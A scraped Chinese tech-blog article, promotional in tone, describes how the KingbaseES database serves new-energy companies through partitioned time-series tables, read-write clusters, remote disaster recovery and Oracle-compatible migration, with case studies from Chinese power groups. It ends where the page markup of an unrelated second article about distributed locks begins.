            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    倔强的石头_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:22:35.000Z" title="Sun Nov 23 2025 08:22:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b59e5aa258b845fc8c7f38558707f456~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=EjncswH7gCo%2BAzdkVNhJOGIhN3Y%3D" alt="640.gif" loading="lazy"/></p>
<p>@[toc]</p>
<h2 data-id="heading-0">引言</h2>
<p>谈到“双碳”与能源革命，风电，光伏这些新能源产业显然是当下最为炙手可热的风口，若想在该赛道跑得更远，更快，数字化和智能化转型并非可选，而是必备功课，要知道，从远程操控成千上万台风电机组，到及时分析大量的设备数据，直至把整个生产运维流程管理得井井有条，哪一步能离开稳定，高效且安全的数据“大后方”呢？</p>
<p>于是，一些问题便随之出现，新能源相关业务对于数据库的要求非常高，其一，物联网设备每日所生成的时序数据量犹如天文数字，其二，生产经营体系要承受高并发访问的压力，那些位于四面八方场站还要执行好容灾备份工作，这就像要求一名后卫不但要速度快而且体格健硕，关键时候也不能出现纰漏。</p>
<p>在此种大背景之下，我们高兴地发现，国产数据库正依靠自身的技术实力与服务，渐渐化为新能源行业数字化转型的中坚力量，金仓数据库（Kingbase）便是其中不可忽略的一个存在，其犹如一位身怀绝技的“扫地僧”，凭借在高性能，高可靠性，高安全性以及智能运作维护方面所积淀的深厚功底，给众多新能源企业的关键系统给予了稳固有力的支持，很好地解决了许多令人头疼的问题。</p>
<hr/>
<h2 data-id="heading-1">关于金仓数据库</h2>
<p>那么，这个金仓数据库到底是什么来头？</p>
<p>简单来说，Kingbase是电科金仓（北京）科技股份有限公司的当家产品。这家公司来头不小，不但是国内最早一批做自主数据库的厂商，还是中国电子科技集团（CETC）的“国家队”成员。他们的目标很明确，就是要做顶尖的企业级数据库产品。</p>
<p>其旗舰产品金仓数据库管理系统KingbaseES（简称KES），就是一款专为事务密集、高并发、高可用的复杂场景打造的企业级关系型数据库。它有几手“独门绝技”：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa25b64f0e334c88b3e0d54130d4d5a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=aLBSol7mNTMuluaP9OmhvBlgun4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/755f78bc8e8549ada0abdf17cd814a3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=LOv6GV1IzvMLOXea9rlSF5A8KQs%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p><strong>卓越性能与自治调优</strong>：听起来很专业，其实可以理解为KingbaseES的内核里藏着一个“调优机器人”。它能自己诊断、自己优化，把以前需要数据库专家熬夜干的活儿，变成了数据库自己的日常工作。这样一来，就算面对几千人同时操作的极端情况，系统也能反应飞快。</p>
</li>
<li>
<p><strong>金融级高可用保障</strong>：新能源业务可是一天24小时、一年365天都不能停的。为了确保万无一失，KingbaseES拿出了一套金融级别的“不死鸟”方案。它支持“一主多备”的集群模式，主服务器的数据能实时同步到备用服务器上，万一主服务器“罢工”，备用服务器能秒级顶上，数据一个都不会丢。它甚至还能搞定跨越上千公里的异地容灾，真正做到高枕无忧。</p>
</li>
<li>
<p><strong>全方位数据安全</strong>：数据安全是命脉。KingbaseES就像给数据穿上了一层层“金钟罩铁布衫”，从访问控制、数据加密到安全审计，防护措施一应俱全，达到了国家信息系统安全等级保护的四级要求。把核心生产数据交给它，心里踏实。</p>
</li>
<li>
<p><strong>高度兼容与平滑迁移</strong>：很多企业最头疼的就是换系统，怕原来的应用跑不起来。KingbaseES早就想到了这一点，它对Oracle的语法兼容性做得非常好，还配了个叫KDTS的“搬家神器”。这个工具能把原来跑在MySQL、PostgreSQL甚至MongoDB上的数据和应用，以极低的成本、甚至“零代码修改”的代价，快速迁移过来，让国产化替代不再是件愁人的事。</p>
</li>
</ul>
<p>正是靠着这些硬核实力，金仓数据库才成了众多关键行业核心系统的放心之选。</p>
<hr/>
<h2 data-id="heading-2">金仓数据库在新能源行业的技术解读</h2>
<p>咱们再往深了聊聊，金仓数据库在新能源行业里，到底是怎么“秀肌肉”的。</p>
<p>一般来说，新能源的数字化系统，比如集控中心、运维平台，有四个“老大难”问题：时序数据多到爆炸、高并发访问压力山大、业务一秒都不能停、老旧系统五花八门。面对这些，KingbaseES见招拆招，用自己的一套组合拳给出了漂亮的答案。</p>
<h3 data-id="heading-3">1. 应对海量时序数据：分区存储与高效查询</h3>
<p><strong>业务挑战</strong>：风机、光伏板这些设备，个个都是数据“生产大户”，每时每刻都在往外蹦各种工况数据。这些数据是宝贝，是设备监控、故障预警的基础。但数据量实在太大了，怎么存、怎么查，才能又快又好，是个大难题。</p>
<p><strong>金仓解决方案</strong>：KingbaseES用了一个聪明的办法——<strong>表分区</strong>。它把一张巨大的数据表，按时间（比如按天或按月）切成一小块一小块。这样做的好处显而易见：</p>
<ul>
<li><strong>写入查询都飞快</strong>：新数据只往最新的那一小块里写，互不干扰。查询的时候，只要告诉它时间范围，它就能精准地找到对应的那几块数据，不用再大海捞针一样地全表扫描。</li>
<li><strong>管理数据超轻松</strong>：过期的历史数据想删掉？简单！以前用<code>DELETE</code>得删半天，还留下一堆“垃圾”。现在直接把对应的旧分区整个端掉就行，秒速完成，干净利落。</li>
</ul>
<p><strong>代码示例：创建按月分区的设备数据表</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建一个按月分区的设备数据主表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics (
    device_id   <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    metric_time <span class="hljs-type">TIMESTAMP</span>   <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    metric_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),
    <span class="hljs-keyword">value</span>       <span class="hljs-type">NUMERIC</span>(<span class="hljs-number">18</span>, <span class="hljs-number">6</span>)
) <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span> (metric_time);

<span class="hljs-comment">-- 为2025年11月和12月创建分区</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics_202511 <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> device_metrics
    <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-11-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2025-12-01'</span>);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics_202512 <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> device_metrics
    <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-12-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2026-01-01'</span>);

<span class="hljs-comment">-- 当查询特定时间范围的数据时，优化器会自动选择对应的分区</span>
<span class="hljs-comment">-- 例如，此查询将仅扫描 device_metrics_202511 分区</span>
<span class="hljs-keyword">SELECT</span> device_id, <span class="hljs-keyword">value</span>
<span class="hljs-keyword">FROM</span> device_metrics
<span class="hljs-keyword">WHERE</span> metric_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2025-11-10'</span> <span class="hljs-keyword">AND</span> metric_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-11-11'</span>;
</code></pre>
<h3 data-id="heading-4">2. 支撑高并发访问：读写分离与自治调优</h3>
<p><strong>业务挑战</strong>：一个生产运维系统，可能同时有几千号人在线操作，有查报表的，有开工单的，有做检修的。这么多请求一股脑儿地涌过来，数据库要是扛不住，整个系统就得卡顿甚至瘫痪。</p>
<p><strong>金仓解决方案</strong>：KingbaseES有两大法宝来应对：<strong>读写分离集群</strong>和<strong>内核自治调优</strong>。</p>
<ul>
<li>
<p><strong>读写分离集群架构</strong>：这个战术很简单，就是“分工合作”。搞一个“一主多备”的集群，主节点是“总指挥”，专门处理“写”这种关键操作。其他几个备节点当“参谋”，从主节点那儿同步数据，然后专门负责“读”这种查询、看报表的工作。这样一来，就把压力分散出去了，大家都能轻松上阵。</p>
<pre><code class="hljs language-scss" lang="scss">+----------------+      /---&gt; <span class="hljs-selector-attr">[备节点1 (只读)]</span>
|   应用服务     |     /
| (读写请求)     |---&gt; <span class="hljs-selector-attr">[主节点 (读写)]</span> ---&gt; <span class="hljs-selector-attr">[备节点2 (只读)]</span>
+----------------+     \
                        \---&gt; <span class="hljs-selector-attr">[备节点3 (只读)]</span>
                                 |
                                 V
                            <span class="hljs-selector-attr">[物理日志流同步]</span>
</code></pre>
</li>
<li>
<p><strong>自治调优能力</strong>：这就是前面提到的“调优机器人”。它能自动优化SQL，还能根据历史经验“学习”进化，让执行计划越来越聪明。甚至在你写的SQL性能不佳时，它还会主动给你提建议，比如“这里该建个索引了”，大大减轻了数据库管理员的负担。</p>
</li>
</ul>
<h3 data-id="heading-5">3. 保障业务连续性：跨地域高可用与容灾</h3>
<p><strong>业务挑战</strong>：核心生产系统，就跟人的心脏一样，一秒钟都不能停。不仅要防止本地出故障，还得能扛得住地震、断电这种区域性的天灾人祸。</p>
<p><strong>金仓解决方案</strong>：KingbaseES提供的是一套经过实战检验的“两地三中心”或“异地双中心”高可用方案。</p>
<ul>
<li>
<p><strong>在生产中心</strong>：部署一个“一主两备”的本地高可用集群。主备之间的数据实时同步。万一主节点“牺牲”，系统几秒内就能自动把备用节点扶正，业务几乎感觉不到中断，数据也零丢失。</p>
</li>
<li>
<p><strong>在异地灾备中心</strong>：在几百甚至上千公里外的另一个城市，再部署一个灾备节点。生产中心的数据会准实时地复制过去。这样，就算整个生产中心都“沦陷”了，还能从容地把业务切换到灾备中心，保住最后的火种。</p>
<pre><code class="hljs language-scss" lang="scss">+---------------------------+      <span class="hljs-selector-attr">[广域网 (WAN)]</span>      +---------------------------+
|      生产中心 (城市A)     |                          |      灾备中心 (城市B)     |
|                           |                          |                           |
|  <span class="hljs-selector-attr">[主]</span> ---&gt; <span class="hljs-selector-attr">[备1]</span> ---&gt; <span class="hljs-selector-attr">[备2]</span> | <span class="hljs-built_in">--</span>(异步物理日志复制)--&gt; |           <span class="hljs-selector-attr">[备3]</span>           |
|  (同步/异步物理日志复制)  |                          |                           |
+---------------------------+                          +---------------------------+
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">4. 实现平滑迁移：高度兼容与自动化工具</h3>
<p><strong>业务挑战</strong>：很多新能源企业一路发展过来，系统里用了MySQL、Oracle、PostgreSQL等各种数据库，五花八门，形成了“数据孤岛”。现在想建一个统一的平台，把这些老系统里的宝贝数据和应用都搬过来，简直是浩大又头疼的工程。</p>
<p><strong>金仓解决方案</strong>：KingbaseES在设计之初就想到了这一点。</p>
<ul>
<li>
<p><strong>它高度兼容Oracle</strong>：从语法、数据类型到存储过程，都跟Oracle很像。这意味着，原来给Oracle写的应用，基本上不用怎么改，甚至不用改，就能直接在KingbaseES上跑起来。</p>
</li>
<li>
<p><strong>它有自动化“搬家”工具KDTS</strong>：这个工具非常强大，能自动搞定数据结构映射、数据迁移、数据校验这些繁琐的活儿。原来可能要花几个星期才能干完的迁移工作，现在几天甚至更短时间就能搞定，风险和成本都大大降低。</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-7">案例分析：金仓数据库赋能新能源智慧运维</h2>
<p>“光说不练假把式”。理论说了这么多，我们来看看金仓数据库在真实战场上的表现到底怎么样。其实，它早就在国家能源集团、中国广核集团、国家电力投资集团等多个大型能源企业的核心系统中“身经百战”了。下面这几个案例，就很有代表性。</p>
<h3 data-id="heading-8">案例一：中广核新能源生产运维系统——应对“整合、高并发、高可用”三大挑战</h3>
<ul>
<li>
<p><strong>业务背景</strong>：中广核的新能源业务摊子铺得很大，风、光、水多点开花，管着600多个场站。但以前的生产系统都是各搞各的，技术五花八门，数据不通，管理起来很费劲。所以，他们下决心要搞一个统一的生产运维系统。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ol>
<li><strong>系统整合难</strong>：要把原来基于MySQL、PostgreSQL、MongoDB等各种数据库的应用和数据都统一起来，这活儿想想就头大。</li>
<li><strong>并发访问高</strong>：新系统上线，得撑住6000多号员工同时在线操作，还要求反应速度要快。</li>
<li><strong>可用性要求极致</strong>：这可是核心生产系统，必须做到金融级的99.999%可用性，还得能跨上千公里搞异地容灾。</li>
</ol>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>平滑迁移，零代码修改</strong>：金仓的团队带着“搬家神器”KDTS一进场，很快就把各个“山头”的数据和应用都收编了过来，软件开发商的应用甚至做到了“零代码修改”，一下子就让大家悬着的心放下了。</li>
<li><strong>自治调优，性能卓越</strong>：面对6000人并发的压力测试，KingbaseES的“调优机器人”大显身手，只花了3天就完成了性能优化，让系统在高压下也能秒级响应。</li>
<li><strong>异地双中心，稳定可靠</strong>：通过部署“生产中心+灾备中心”的架构，KingbaseES给系统上了双保险，确保了7x24小时的稳定运行。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e691206c448246ff96d772447f3d78d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=%2FDpJ%2F8Q9yE1Ic0S9%2B1z26PEB0xM%3D" alt="image.png" loading="lazy"/></li>
</ul>
</li>
</ul>
<h3 data-id="heading-9">案例二：国家能源集团龙源电力——186个新能源场站集控系统国产化替代</h3>
<ul>
<li>
<p><strong>业务背景</strong>：龙源电力是全球最大的风电运营商，他们要在全国27个省区的186个场站搞一套新的集控系统，把数据都统一管起来。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ol>
<li><strong>部署范围广</strong>：项目遍布大江南北，对部署、运维和本地化服务的响应能力是个巨大考验。</li>
<li><strong>核心系统可靠性</strong>：场站的集控核心系统绝对不能出问题，原来用的Oracle虽然稳，但维保成本高，还有“卡脖子”的风险。</li>
<li><strong>数据安全</strong>：这些可都是核心生产数据，安全等级要求非常高。</li>
</ol>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>主备高可用，保障业务连续</strong>：每个场站都用KingbaseES搞了“双机主备”架构，成功换掉了Oracle，既保证了业务不中断，也做好了数据备份。</li>
<li><strong>高度兼容Oracle，快速迁移</strong>：因为KingbaseES和Oracle很“像”，整个替换过程非常顺滑，应用基本没怎么改。</li>
<li><strong>全国服务网络，本地化支持</strong>：金仓遍布全国的服务网络发挥了巨大作用，为27个省区的项目提供了7x24小时的本地支持，确保了项目顺利落地。</li>
<li><strong>安全合规</strong>：KingbaseES自带的各种安全功能，完全满足国家对核心数据安全的要求，让人放心。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a5ff48045c54bd981adffc1e19a548d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=TVeoY%2Bwwk64gHOKu8IGRBTTgL5E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">案例三：国家电投集团甘肃新能源——“无人值守”风电场集控系统</h3>
<ul>
<li>
<p><strong>业务背景</strong>：为了在偏远地区实现风电场“无人值班、少人值守”的智慧运维，国家电投甘肃新能源公司需要一套高度自动化的集控系统。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ul>
<li><strong>数据一致性</strong>：“无人值守”模式下，数据绝对不能出错，否则一个错误的指令就可能造成巨大损失。</li>
<li><strong>业务连续性</strong>：自动化调度系统必须像永动机一样不停运转。</li>
</ul>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>高可用架构，替代Oracle</strong>：同样，KingbaseES的高可用方案成功替代了Oracle，既保证了系统冗余，也确保了数据安全可靠。</li>
<li><strong>原厂本地化服务</strong>：金仓的运维团队提供了“秒级响应”的本地服务，成了系统稳定运行的坚实后盾，也为后续更大范围的国产化铺平了道路。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-11">结语</h2>
<p>写到最后，就会察觉，在形成新型电力系统这一时代洪流当中，数字化和智能化是极为关键的“船”与“桨”。</p>
<p>回顾金仓数据库的技术要点及其在新能源领域的实际应用情况，不论是解决复杂的异构数据迁移问题，承受大量的并发访问压力，还是保障“无人值守”风电场的稳定运行，该数据库均表现出色，这表明其作为国产数据库的领先者，具备成为新能源行业核心业务稳固根基的能力与实力。</p>
<p>未来的新能源世界必定会愈加重视数据，金仓数据库这般既精通技术又了解行业的人才将会一直发挥关键作用，凭借其稳定，可靠且高效的数据能力不断给中国新能源事业增添活力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大场面试之最终一致性与分布式锁]]></title>    <link>https://juejin.cn/post/7575655132748300324</link>    <guid>https://juejin.cn/post/7575655132748300324</guid>    <pubDate>2025-11-23T08:23:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748300324" data-draft-id="7575442779038777386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大场面试之最终一致性与分布式锁"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-23T08:23:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大场面试之最终一致性与分布式锁
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:23:56.000Z" title="Sun Nov 23 2025 08:23:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 